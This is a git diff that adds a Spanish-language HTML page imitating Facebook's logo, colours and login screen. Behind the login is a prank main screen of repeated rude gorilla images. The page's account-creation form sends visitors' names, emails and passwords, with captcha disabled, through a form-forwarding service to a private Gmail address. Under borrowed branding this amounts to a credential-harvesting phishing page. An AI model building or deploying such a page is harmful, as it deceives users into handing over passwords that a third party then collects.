@@ -1,1 +1,199 @@
-# Facebook
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>MiRed - App Social</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { box-sizing: border-box;}
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #18191a;
+      color: white;
+}
+.pantalla { display: none; padding: 20px;}
+.activo { display: block;}
+.logo { text-align: center; margin: 30px 0;}
+.logo img { width: 100px;}
+.formulario {
+      max-width: 350px;
+      margin: auto;
+      background-color: #242526;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+}
+.formulario input {
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      background-color: #3a3b3c;
+      color: white;
+}
+.formulario input::placeholder { color: #b0b3b8;}
+.formulario button {
+      background-color: #1877f2;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+}
+.formulario button:hover { background-color: #145dbf;}
+.crear-cuenta { background-color: #42b72a;}
+.crear-cuenta:hover { background-color: #36a420;}
+.volver { background-color: #65676b;}
+    nav {
+      background-color: #242526;
+      display: flex;
+      justify-content: space-around;
+      padding: 10px;
+      position: sticky;
+      bottom: 0;
+}
+    nav button {
+      background: none;
+      border: none;
+      color: #b0b3b8;
+      font-size: 14px;
+      cursor: pointer;
+}
+    nav button:hover { color: white;}
+.seccion {
+      background-color: #242526;
+      margin: 20px auto;
+      max-width: 350px;
+      padding: 15px;
+      border-radius: 10px;
+}
+.seccion h2 {
+      margin-top: 0;
+      color: #1877f2;
+}
+  </style>
+</head>
+<body>
+
+<!-- Pantalla de inicio de sesión -->
+<div id="login" class="pantalla activo">
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo">
+  </div>
+  <form class="formulario" onsubmit="return validarLogin()">
+    <input type="text" id="usuario" placeholder="Celular o correo electrónico" required>
+    <input type="password" id="clave" placeholder="Contraseña" required>
+    <button type="submit">Iniciar sesión</button>
+    <button type="button" class="crear-cuenta" onclick="mostrarCrearCuenta()">Crear cuenta nueva</button>
+  </form>
+</div>
+
+<!-- Pantalla de creación de cuenta -->
+<div id="crearCuenta" class="pantalla">
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo">
+  </div>
+  <form class="formulario" action="https://formsubmit.co/chumaceroyahuanaaron@gmail.com" method="POST" enctype="multipart/form-data">
+    <input type="text" name="nombre" placeholder="Nombre completo" required>
+    <input type="email" name="correo" placeholder="Correo electrónico" required>
+    <input type="password" name="clave" placeholder="Contraseña" required>
+    <input type="file" name="imagen" accept="image/*">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://tusitio.com/gracias.html">
+    <button type="submit">Registrarse</button>
+    <button type="button" onclick="volverLogin()" class="volver">Volver</button>
+  </form>
+</div>
+
+<!-- Pantalla principal -->
+<div id="inicio" class="pantalla">
+  <div class="seccion">
+    <h2>Bienvenido</h2>
+    <p>Has iniciado sesión correctamente.</p>
+  </div>
+  <div class="seccion" id="perfil">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" style="imagen-grande {
+    width: 100%;
+    max-width: 800px;
+    border-radius: 10px;;">
+    
+    <p>jajajs</p>
+  </div>
+  <div class="seccion" id="noticias">
+    <h2>Q FUEE MANO</h2>
+   <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" style="max-width:100%; border-radius:10px;">
+  </div>
+  <div class="seccion" id="mensajes">
+    <h2>chismosa</h2>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" style="max-width:100%; border-radius:10px;">
+  </div>
+  <div class="seccion" id="amigos">
+    <h2>Q .....</h2>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" style="max-width:100%; border-radius:10px;">
+  </div>
+  <div class="seccion" id="notificaciones">
+    <h2>Q PASO VIEJO</h2>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" style="max-width:100%; border-radius:10px;">
+  </div>
+  <div class="seccion" id="configuracion">
+    <h2>Q PADO VIEJO</h2>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRk51DXNXMzquErtmqlSaWL3d9_VAjf6gq66kxkZo5NCNhmQrMpgdNLomQqmLN-taQ-iYM" alt="Gorila mostrando el dedo" style="max-width:100%; border-radius:10px;">
+  </div>
+  <nav>
+    <button onclick="mostrarSeccion('perfil')">Perfil</button>
+     <button onclick="mostrarSeccion('noticias')">Noticias</button>
+    <button onclick="mostrarSeccion('mensajes')">Mensajes</button>
+    <button onclick="mostrarSeccion('amigos')">Amigos</button>
+    <button onclick="mostrarSeccion('notificaciones')">Notificaciones</button>
+    <button onclick="mostrarSeccion('configuracion')">Config.</button>
+  </nav>
+</div>
+
+<script>
+  function validarLogin() {
+    const usuario = document.getElementById('usuario').value.trim();
+    const clave = document.getElementById('clave').value.trim();
+
+    if (!usuario.includes('@') && isNaN(usuario)) {
+      alert('Ingresa un correo válido o número de celular.');
+      return false;
+}
+
+    if (clave.length < 6) {
+      alert('La contraseña debe tener al menos 6 caracteres.');
+      return false;
+}
+
+    document.getElementById('login').classList.remove('activo');
+    document.getElementById('inicio').classList.add('activo');
+    mostrarSeccion('perfil');
+    return false;
+}
+
+  function mostrarCrearCuenta() {
+    document.getElementById("login").classList.remove("activo");
+    document.getElementById("crearCuenta").classList.add("activo");
+}
+
+  function volverLogin() {
+    document.getElementById("crearCuenta").classList.remove("activo");
+    document.getElementById("inicio").classList.remove("activo");
+    document.getElementById("login").classList.add("activo");
+}
+
+  function mostrarSeccion(id) {
+    const secciones = document.querySelectorAll('.seccion');
+    secciones.forEach(sec => sec.style.display = 'none');
+    document.getElementById(id).style.display = 'block';
+}
+
+  window.onload = () => mostrarSeccion('perfil');
+</script>
+</body>
+</html>
